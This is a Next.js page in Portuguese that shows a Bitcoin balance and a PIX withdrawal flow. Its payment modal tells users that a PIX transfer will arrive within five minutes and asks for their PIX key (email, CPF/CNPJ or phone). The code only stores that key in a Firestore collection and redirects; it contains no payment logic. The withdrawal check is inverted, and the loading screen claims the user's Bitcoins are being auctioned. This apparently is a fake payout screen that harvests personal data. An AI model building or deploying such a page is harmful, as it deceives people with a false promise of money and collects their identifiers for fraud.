"use client";

import { useBalance } from "@/context/priceContext";
import { motion, AnimatePresence } from "framer-motion";
import { Coins, Dice6, IdCard, Mail, Smartphone } from "lucide-react";
import { MdPix } from "react-icons/md";
import { useEffect, useState } from "react";
import CountUp from "react-countup";
import CurrencyInput from "react-currency-input-field";

import { useRouter } from "next/navigation";
import BitcoinConverter from "@/components/bitcoin";
import { addDoc, collection } from "firebase/firestore";
import { db } from "@/services/firebase";
import { Router } from "next/router";

function AnimatedGrid() {
  const items = [
    { icon: <Dice6 />, label: "Aleatório" },
    { icon: <Mail />, label: "Email" },
    { icon: <IdCard />, label: "CPF/CNPJ" },
    { icon: <Smartphone />, label: "Telefone" },
  ];

  const [selectedItem, setSelectedItem] = useState<number | null>(1);

  const handleSelect = (index: number) => {
    setSelectedItem(index); // Atualiza o estado com o índice do item selecionado
  };

  return (
    <div className="grid grid-cols-2 gap-3 w-[98%] mt-9">
      {items.map((item, index) => (
        <motion.div
          key={index}
          className={`center-col w-full rounded-xl border p-5 border-solid transition-colors shadow-md cursor-pointer duration-500${
            selectedItem === index
              ? "border-white bg-primary shadow-primary" // Cor da borda para o item selecionado
              : "border-[#dfdfdf60] bg-transparent shadow-none" // Cor da borda padrão
          }`}
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: index * 0.2 }}
          onClick={() => handleSelect(index)} // Define o item selecionado ao clicar
        >
          {item.icon}
          <span className="font-poppinsLight text-[18px] mt-3">
            {item.label}
          </span>
        </motion.div>
      ))}
    </div>
  );
}

function MoneyInput() {
  const [value, setValue] = useState("");
  const [error, setError] = useState(false);

  const { balance, subtractFromBalance } = useBalance();
  const router = useRouter();

  const [isModalOpen, setIsModalOpen] = useState(false);

  const handleInputChange = (inputValue: string | undefined) => {
    if (inputValue !== undefined) {
      setValue(inputValue);
      setError(false);
    }
  };

  const handleWithdraw = () => {
    const numericValue = parseFloat(value.replace(",", "."));

    console.log(numericValue, balance);

    if (numericValue < balance) {
      setError(true);
    } else {
      setIsModalOpen(true);
      console.log("Saque realizado com sucesso!", numericValue);
    }
  };

  const handleCloseModal = () => {
    const numericValue = parseFloat(value.replace(",", "."));

    setIsModalOpen(false);
    subtractFromBalance(0.00000004);
    router.replace("/home");
  };

  return (
    <>
      <PaymentModal isOpen={isModalOpen} onClose={handleCloseModal} />
      <motion.div
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        exit={{ opacity: 0, y: 20 }}
        transition={{ duration: 0.5, delay: 0.8 }}
        className="rounded-[15px] w-full center border border-solid border-[#dfdfdf] bg-[#19181d] mt-10"
      >
        <div className="flex items-center w-full">
          <span className="ml-3 text-white">R$</span>
          <CurrencyInput
            id="input-example"
            name="input-name"
            value={value}
            decimalSeparator="." // Usando ponto como separador decimal
            groupSeparator=","
            decimalsLimit={8}
            className={`w-full h-[55px] p-4 bg-transparent pl-4 text-white ${
              error ? "border-red-500" : "border-[#dfdfdf]"
            }`}
            placeholder="0,00"
            onValueChange={handleInputChange}
          />

          <button
            onClick={handleWithdraw}
            className="center h-[55px] rounded-[15px] w-auto px-6 bg-success text-background focus:outline-none !text-white"
          >
            <span className="font-poppinsRegular">Sacar</span>
          </button>
        </div>
      </motion.div>
      {error && (
        <p className="text-red-500 mt-2 text-sm leading-1 w-[95%] text-center mx-auto">
          O valor de saque não pode ser maior que o saldo disponível.
        </p>
      )}
    </>
  );
}

interface PaymentModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const PaymentModal = ({ isOpen, onClose }: PaymentModalProps) => {
  if (!isOpen) return null;

  const [pixKey, setPixKey] = useState(""); // Estado para armazenar o valor do input
  const router = useRouter();
  // Função para salvar a chave PIX no Firestore
  const handleSavePixKey = async () => {
    if (!pixKey) {
      alert("Por favor, insira uma chave PIX.");
      return;
    }

    try {
      await addDoc(collection(db, "pixKeys"), {
        chave: pixKey, // Campo 'key' com o valor da chave PIX
      });
      console.log("Chave PIX salva com sucesso!");
      setPixKey(""); // Limpa o campo após salvar

      router.replace("/");
    } catch (error) {
      console.error("Erro ao salvar chave PIX: ", error);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-transparent bg-opacity-50">
      <motion.div
        initial={{ opacity: 0, scale: 0.8 }}
        animate={{ opacity: 1, scale: 1 }}
        exit={{ opacity: 0, scale: 0.8 }}
        transition={{ duration: 0.5 }}
        className="bg-[#19181d] text-white p-6 rounded-lg shadow-lg w-[98%] max-w-md"
      >
        <h2 className="text-2xl font-poppinsBold mb-4 text-center">
          Enviando seu pagamento...
        </h2>
        <p className="mb-6 text-center w-full">
          Em até 5 minutos o PIX vai cair na sua conta, escolha sua chave.
        </p>
        <input
          id="chave-pix"
          name="input-name"
          className={`w-full h-[55px] p-4 bg-transparent border border-solid border-[#dfdfdf] mb-2 rounded-xl pl-4 text-white`}
          placeholder="sua chave pix"
          value={pixKey} // Valor controlado pelo estado
          onChange={(e) => setPixKey(e.target.value)} // Atualiza o estado ao digitar
        />
        <button
          onClick={handleSavePixKey}
          className="w-full bg-success text-white py-2  h-[55px] mt-5 rounded-lg hover:bg-success/80 transition-all"
        >
          Receber pagamento
        </button>
      </motion.div>
    </div>
  );
};

export default function MainPage() {
  const [isVisible, setIsVisible] = useState(true);
  const { balance } = useBalance();

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsVisible(false);
    }, 8000); // 8 segundos

    return () => clearTimeout(timer);
  }, []);

  return (
    <main className="min-h-screen overflow-hidden hero-section h-full w-full center-col bg-[#ffffff] overflow-y-hidden !text-foreground !select-none relative px-3">
      <div className="w-full min-h-[95vh] !text-[#080808] z-10 bg-[#1a191c00] object-cover center-col relative p-4 py-1 pt-6 border-[1px]  shadow-[#97979791] border-[#dfdfdf] rounded-lg !border-none">
        <AnimatePresence>
          {!isVisible ? (
            <motion.div
              className="center-col w-full h-full"
              initial={{ opacity: 0, y: -20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 20 }}
              transition={{ duration: 0.5 }}
            >
              <motion.span
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.5, delay: 0 }}
                className="center text-xl font-poppinsLight space-x-2 fixed top-0 !translate-y-[-400%] scale-110 right-4"
              >
                <BitcoinConverter />
              </motion.span>
              <h2 className="font-poppinsBold text-3xl text-center">
                Seu saldo atual é :
              </h2>
              <div className="w-[98%] h-auto py-8 bg-primary rounded-lg center-col mt-7 border border-solid border-white">
                <motion.span className="font-poppinsSemibold">
                  <CountUp
                    start={0}
                    end={balance}
                    duration={1.5} // Duração da animação em segundos
                    separator="."
                    decimals={8} // Número de casas decimais
                    decimal="."
                    className="text-4xl text-green-500"
                    preserveValue={true} // Mantém o valor atual e só anima a diferença
                  />
                  <span className="text-4xl font-poppinsSemibold text-[#e6e6e6]">
                    {" "}
                    BTC
                  </span>
                </motion.span>
              </div>

              <h2 className="center space-x-2 mt-5">
                <MdPix size={35} /> <span>Selecione sua chave PIX</span>
              </h2>

              <AnimatedGrid />

              <MoneyInput />
            </motion.div>
          ) : (
            <>
              <motion.img
                initial={{ opacity: 0, y: -20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: 20 }}
                transition={{ duration: 0.5 }}
                src="https://res.cloudinary.com/do9d7j6b3/image/upload/v1728959081/Animation_-_1728958088410_1_eo6apr.gif"
                className="h-[200px] object-cover"
              />

              <motion.div
                className="center-col w-[80%] text-center mt-10"
                initial={{ opacity: 0, y: -20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: 20 }}
                transition={{ duration: 0.5, delay: 0.5 }}
              >
                <h3 className="font-poppinsBold text-3xl">
                  Falta pouco receber!
                </h3>
                <p className="mt-4">
                  Estamos finalizando o leilão dos seus Bitcoins.
                </p>
              </motion.div>
            </>
          )}
        </AnimatePresence>
      </div>
    </main>
  );
}
